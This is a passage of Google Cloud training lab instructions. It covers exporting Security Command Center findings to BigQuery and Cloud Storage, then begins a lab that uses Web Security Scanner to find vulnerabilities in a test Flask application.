session (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>).</span></p></li><li><p><span>In your Cloud Shell session, run the following command to create a new BigQuery dataset:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PROJECT_ID=$(gcloud config get project)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bq --location=europe-west4 --apilog=/dev/null mk --dataset \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">$PROJECT_ID:continuous_export_dataset</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>You have not used an SCC command line interface in this project yet, so you need to enable the SCC service. Run the following command to enable the service in the current project:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable securitycenter.googleapis.com</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Now create a new export by entering this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud scc bqexports create scc-bq-cont-export --dataset=projects/qwiklabs-gcp-04-0f5774f16b5e/datasets/continuous_export_dataset --project=qwiklabs-gcp-04-0f5774f16b5e</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Ensure you receive a similar output message to the following.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created.</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">dataset: projects/qwiklabs-gcp-04-571fad72c1e8/datasets/continuous_export_dataset</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mostRecentEditor: student-03-fbc57ac17933@qwiklabs.net</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">name: projects/102856953036/bigQueryExports/SCC-bq-cont-export</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">principal: service-org-616463121992@gcp-sa-scc-notification.iam.gserviceaccount.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">updateTime: '2023-05-31T15:44:22.097585Z'</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Once new findings are exported to BigQuery, SCC creates a new table. You can now initiate new SCC findings.</span></p><ol start='' ><li><p><span>Run the following commands to create three new service accounts without any IAM permissions and create three user-managed service account keys for them.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">for i in {0..2}; do</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam service-accounts create sccp-test-sa-$i;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam service-accounts keys create /tmp/sa-key-$i.json \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--iam-account=sccp-test-sa-$i@qwiklabs-gcp-04-0f5774f16b5e.iam.gserviceaccount.com;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">done</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Once new findings are created in SCC, they are exported to BigQuery. For storing them, the export pipeline creates a new table called </span><code>findings</code><span>.</span></p><ol start='' ><li><p><span>Run the following command to fetch information from BigQuery about newly created findings:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bq query --apilog=/dev/null --use_legacy_sql=false  \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"SELECT finding_id,event_time,finding.category FROM continuous_export_dataset.findings"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Soon after you should receive output similar to the following.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">+----------------------------------+---------------------+------------------------------------------+</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  finding_id &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  | &nbsp; &nbsp; event_time &nbsp; &nbsp;  | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; category &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">+----------------------------------+---------------------+------------------------------------------+</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| c5235ebb04b140198874ce52080422b8 | 2024-11-27 08:08:08 | Persistence: Service Account Key Created |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| 94d933ee9803d0f1c807551fd22a0269 | 2024-11-27 08:08:04 | USER_MANAGED_SERVICE_ACCOUNT_KEY &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">+----------------------------------+---------------------+------------------------------------------+</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> It may take </span><strong><span>10+ minutes</span></strong><span> for these findings to be generated. Rerun the above command if you don&#39;t receive a similar output.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Export findings to a BigQuery dataset</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='export-findings-to-a-cloud-storage-bucket-and-create-a-bigquery-table'><span>Export findings to a Cloud Storage bucket and create a BigQuery table</span></h3><p><span>Security Command Center is typically enabled in pre-existing and mature Google Cloud infrastructures. As soon as the SCC is enabled, it starts scanning existing vulnerabilities and eventually might report thousands of findings on existing infrastructure.</span></p><p><span>The SCC interface might not provide the best way to sort and filter such findings, so exporting these findings to a BigQuery database is a common practice for running analytics against findings.</span></p><p><span>Direct exporting of findings to BigQuery is not supported yet. Instead, you can use a Google Cloud Storage bucket as an interim storage solution.</span></p><h4 id='create-a-cloud-storage-bucket-3'><span>Create a Cloud Storage bucket</span></h4><p><span>To export </span><em><span>existing</span></em><span> findings to a BigQuery interface, you need to export them first to a Cloud Storage bucket. In this section, you create the storage bucket.</span></p><ol start='' ><li><p><span>In the Cloud console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>Cloud Storage &gt; Buckets</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Create</span></strong><span> button.</span></p></li><li><p><span>Every bucket name in Google Cloud must be unique. Set the bucket name to </span><strong><span>scc-export-bucket-</span><code>qwiklabs-gcp-04-0f5774f16b5e</code></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Set the </span><strong><span>Location type</span></strong><span> to </span><strong><span>Region</span></strong><span>.</span></p></li><li><p><span>Choose </span><strong><code>europe-west4</code></strong><span> for the location.</span></p></li><li><p><span>Do not change any other settings. Scroll down the page and click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Confirm</span></strong><span> button when asked whether to &quot;Enforce public access prevention&quot; on this bucket.</span></p></li></ol><h4 id='export-existing-findings-as-jsonl-data'><span>Export existing findings as JSONL data</span></h4><p><span>In this section, you export your findings for use in a BigQuery database.</span></p><ol start='' ><li><p><span>In the Cloud console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>Security &gt; Findings</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Export</span></strong><span> button.</span></p></li><li><p><span>From the dropdown list, select </span><strong><span>Cloud Storage</span></strong><span>.</span></p></li><li><p><span>For the project name, </span><strong><span>Select</span></strong><span> the Project ID as </span><strong><code>qwiklabs-gcp-04-0f5774f16b5e</code></strong><span> (</span><em><span>do not</span></em><span> select Qwiklabs Resources).</span></p></li><li><p><span>Then select the Export path by clicking the </span><strong><span>Browse</span></strong><span> button.</span></p></li><li><p><span>Click the arrow next to the </span><strong><span>scc-export-bucket-</span><code>qwiklabs-gcp-04-0f5774f16b5e</code></strong><span> button.</span></p></li><li><p><span>Set the filename to </span><code>findings.jsonl</code><span> and click </span><strong><span>Select</span></strong><span>.</span></p></li><li><p><span>In the Format drop-down list, select </span><strong><span>JSONL</span></strong><span>.</span></p></li><li><p><span>Change the Time Range to </span><strong><span>All time</span></strong><span>.</span></p><p><span>Do not modify the default findings query.</span></p><p><span>The final &quot;Export to&quot; form should look similar to the following.</span></p></li></ol><p><img src="images\e1Bs3k4qI8jFPaRFOaNTcIRzNPTF3IIrLynUGWEh9hk%3D" referrerpolicy="no-referrer" alt="Sample of export to configuration"></p><ol start='' ><li><p><span>Click the </span><strong><span>Export</span></strong><span> button.</span></p></li></ol><h4 id='create-a-table-in-bigquery'><span>Create a table in BigQuery</span></h4><p><span>In this section, you use the exported findings data to create a table in BigQuery.</span></p><ol start='' ><li><p><span>In the Cloud console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>BigQuery &gt; BigQuery Studio</span></strong><span>.</span></p></li><li><p><span>From the left-hand </span><strong><span>Explore</span></strong><span> menu, click on the </span><strong><span>Add</span></strong><span> button.</span></p></li><li><p><span>In a new </span><strong><span>Add</span></strong><span> window, click on </span><strong><span>Google Cloud Storage</span></strong><span> and set the following parameters:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><strong><span>Setting</span></strong></th><th style='text-align:left;' ><strong><span>Value</span></strong></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Create table from</span></strong></td><td style='text-align:left;' ><code>Google Cloud Storage</code></td></tr><tr><td style='text-align:left;' ><strong><span>Select the file from GCS bucket</span></strong></td><td style='text-align:left;' ><code>scc-export-bucket-qwiklabs-gcp-04-0f5774f16b5e/findings.jsonl</code></td></tr><tr><td style='text-align:left;' ><strong><span>File format</span></strong></td><td style='text-align:left;' ><code>JSONL</code></td></tr><tr><td style='text-align:left;' ><strong><span>Dataset</span></strong></td><td style='text-align:left;' ><code>continuous_export_dataset</code></td></tr><tr><td style='text-align:left;' ><strong><span>Table</span></strong></td><td style='text-align:left;' ><code>old_findings</code></td></tr><tr><td style='text-align:left;' ><strong><span>Schema</span></strong></td><td style='text-align:left;' ><span>Enable the &quot;Edit as text&quot; toggle</span></td></tr></tbody></table></figure><ol start='' ><li><p><span>Now paste in the following schema:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[ &nbsp; </span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  "mode": "NULLABLE",</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  "name": "resource",</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  "type": "JSON"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }, &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  "mode": "NULLABLE",</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  "name": "finding",</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  "type": "JSON"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">]</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 270px;"></div><div class="CodeMirror-gutters" style="display: none; height: 270px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Create table</span></strong><span> button.</span></p></li><li><p><span>Once the new table is created, click the link in the notification that says, </span><strong><span>Go to table</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Preview</span></strong><span> tab and confirm you can view your existing findings.</span></p></li></ol><p><img src="images\2k1HiII2HAmDhjRNaHLEFxrpUNBMLDxKbnWM%2FbyXufc%3D" referrerpolicy="no-referrer" alt="BigQuery table values"></p><p>&nbsp;</p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Export findings to a Cloud Storage bucket and create a BigQuery table</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='congratulations-39'><span>Congratulations!</span></h2><p><span>In this lab, you have learned about Security Command Center and analyzed assets as well as exported findings to BigQuery.</span></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h2 id='lab---identify-application-vulnerabilities-with-security-command-center-2'><span>LAB - Identify Application Vulnerabilities with Security Command Center</span></h2><h2 id='overview-42'><span>Overview</span></h2><p><span>Web Security Scanner (WSS) is one of </span><a href='https://cloud.google.com/security-command-center'><span>Security Command Center&#39;s</span></a><span> built-in services that can be used to identify security vulnerabilities in App Engine, Google Kubernetes Engine (GKE), and Compute Engine web applications.</span></p><p><span>This service crawls your application, following all links within the scope of your starting URLs, and attempts to exercise as many user inputs and event handlers as possible. It can automatically scan and detect four common vulnerabilities, including cross-site-scripting (XSS), flash injection, mixed content (HTTP in HTTPS), and outdated/insecure libraries.</span></p><p><span>Web Security Scanner enables early identification of vulnerabilities and delivers very low false positive rates. You can easily set up, run, schedule, and manage security scans.</span></p><p><span>In this lab, you use Web Security Scanner to scan a Python Flask application for vulnerabilities.</span></p><h3 id='objectives-30'><span>Objectives</span></h3><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Launch a vulnerable Python Flask application on a Compute Engine instance.</span></p></li><li><p><span>Use Web Security Scanner to scan the application and find vulnerabilities.</span></p></li><li><p><span>Fix the application vulnerability.</span></p></li><li><p><span>Scan the application again and verify vulnerabilities no longer exist.</span></p></li></ul><h2 id='setup-and-requirements-37'><span>Setup and requirements</span></h2><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h2 id='scenario-4'><span>Scenario</span></h2><p><img src="images\7HNsRbL5DC5fTizZUhMXIP9PpTe%2F03j3kzaLp2KOqmI%3D" referrerpolicy="no-referrer" alt="Cymbal Bank logo"></p><p>&nbsp;</p><p><span>Cymbal Bank is an American retail bank with over 2,000 branches in all 50 states. It offers comprehensive debit and credit services that are built on top of a robust payments platform. Cymbal Bank is a digitally transforming legacy financial services institution.</span></p><p><span>Cymbal Bank was founded in 1920 under the name Troxler. Cymbal Group acquired the company in 1975 after it had been investing heavily in Cymbal Group&#39;s proprietary ATMs. As the bank grew into a national leader, they put strategic emphasis on modernizing the customer experience both in-person at their branches and digitally through an app they released in 2014. Cymbal Bank employs 42,000 people nationwide and, in 2019, reported $24 billion in revenue.</span></p><p><span>Cymbal Bank is interested in developing a new banking application for their corporate clients using Google Cloud technology. Application security is critical, and the CTO wants to see how Google Cloud can identify and mitigate application security vulnerabilities. As a Cloud Security Engineer, you are tasked with demonstrating Security Command Center&#39;s cutting-edge application vulnerability scanning features.</span></p><h2 id='task-1-launch-a-virtual-machine-and-create-a-firewall-rule-for-wss-2'><span>Task 1. Launch a virtual machine and create a firewall rule for WSS</span></h2><p><span>In this task, you set up the infrastructure to demonstrate an application vulnerability to Cymbal Bank&#39;s CTO. More specifically, you deploy a virtual machine and open a firewall rule for Web Security Scanner to be able to access the vulnerable application that you intend to deploy.</span></p><ol start='' ><li><p><span>On the Google Cloud console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>). If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Create a static IP address that can be used for scanning a vulnerable web application by running the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: 